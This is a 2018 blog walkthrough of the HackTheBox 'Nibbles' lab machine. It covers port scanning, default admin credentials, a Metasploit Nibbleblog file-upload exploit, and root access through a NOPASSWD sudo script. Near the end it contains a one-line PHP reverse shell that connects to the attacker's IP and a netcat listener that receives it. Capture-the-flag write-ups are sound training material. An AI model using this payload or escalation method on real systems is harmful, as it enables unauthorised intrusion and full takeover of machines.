---
layout: post
title: Nibbles - Hackthebox
date: 2018-04-11 19:39
author: rowbot
comments: true
categories: [Hackthebox]
---
<strong>Skills Required</strong>
Basic knowledge of Linux
Enumerating ports and services

<strong>Skills Learned</strong>
Very Basic scripting
Web enumeration
Exploiting NOPASSWD

START

Nmap scan revealed 2 open ports 22 and 80
<pre>[root:~]# nmap -p- -f 10.10.10.75
Starting Nmap 7.70 ( https://nmap.org ) at 2018-04-16 12:10 BST
Nmap scan report for 10.10.10.75
Host is up, received echo-reply ttl 63 (0.032s latency).
Not shown: 65311 closed ports, 222 filtered ports
Reason: 65311 resets and 222 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT STATE SERVICE REASON
22/tcp open ssh syn-ack ttl 63
80/tcp open http syn-ack ttl 63</pre>
Browsing to the webpage gave me this and viewing the source directed me to a blog type website.
<p style="text-align: justify;"><img class="alignnone size-full wp-image-74" src="http://offsecnewbie.com/wp-content/uploads/2018/04/selection_0011.png" alt="Selection_001" width="238" height="203" /></p>
<p style="text-align: justify;"><img class="alignnone size-full wp-image-73" src="http://offsecnewbie.com/wp-content/uploads/2018/04/selection_002.png" alt="Selection_002" width="493" height="359" /></p>
<p style="text-align: justify;"><img class="alignnone wp-image-72" src="http://offsecnewbie.com/wp-content/uploads/2018/04/selection_003.png" alt="Selection_003" width="719" height="402" /></p>
I ran a dirbuster on 10.10.10.75/nibblesblog and found an admin area. I googled the default creds for nibblesblog and tried them. It worked

&nbsp;

<img class="alignnone wp-image-102" src="http://offsecnewbie.com/wp-content/uploads/2018/05/adminarea.png" alt="adminarea" width="715" height="340" />

I looked to see if there were any exploits for nibble and seen there was a Metasploit module.
<pre>[root:~/Desktop/nibbles]# searchsploit nibble
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title | Path
 | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Nibbleblog - Arbitrary File Upload (Metasploit) | exploits/php/remote/38489.rb
Nibbleblog - Multiple SQL Injections | exploits/php/webapps/35865.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
[root:~/Desktop/nibbles]# cat /usr/share/exploitdb/exploits/php/webapps/35865.txt
source: http://www.securityfocus.com/bid/48339/info

Nibbleblog is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in an SQL query.

A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.

Nibbleblog 3.0 is affected; other versions may also be vulnerable.

http://www.example.com/index.php?page=[SQLi]
http://www.example.com/post.php?idpost=[SQLi]# [root:~/Desktop/nibbles]#</pre>
I cranked up Metasploit and ran the exploit with the following details and got a Metreperter shell:

<img class="alignnone size-full wp-image-104" src="http://offsecnewbie.com/wp-content/uploads/2018/05/metalogin.png" alt="metalogin" width="991" height="891" />

I navigated to the home directory and into nibbler's home directory to get the user.
<pre>meterpreter &gt; cat user.txt
b02ff32bb332deba49eeaed21152c8d8</pre>
Its always good to see what su access you have. What i've found in HTB is that it generally gives away what you have to modify and run to get root. Sure enough:
<pre>meterpreter &gt; shell
Process 22018 created.
Channel 1 created.
sudo -l
sudoMatching Defaults entries for nibbler on Nibbles:
 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
 (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
: unable to resolve host Nibbles: Connection timed out</pre>
So I can run monitor.sh as root which will allow me to get a reverse root shell. I unzipped the personal zip folder and added this to the bottom of monitor.sh
<pre>sudo php -r '$sock=fsockopen("10.10.14.234",44444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</pre>
I started a netcat listener on the 44444 port. After about 20 seconds I got a connection back.
<pre>[root:...ktop/nibbles/personal/stuff]# nc -lvp 44444
listening on [any] 44444 ...
10.10.10.75: inverse host lookup failed: Unknown host
connect to [10.10.14.234] from (UNKNOWN) [10.10.10.75] 50308
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cat /root/root.txt
b6d745c0dfb6457c55591efc898ef88c
#</pre>
FIN

Conclusion

This was quite and easy box for me. Not long ago I had finished Bashed and remembered to take advantage of the sudo -l. I want to go back and redo this box before it retires and complete it without using metasploit.
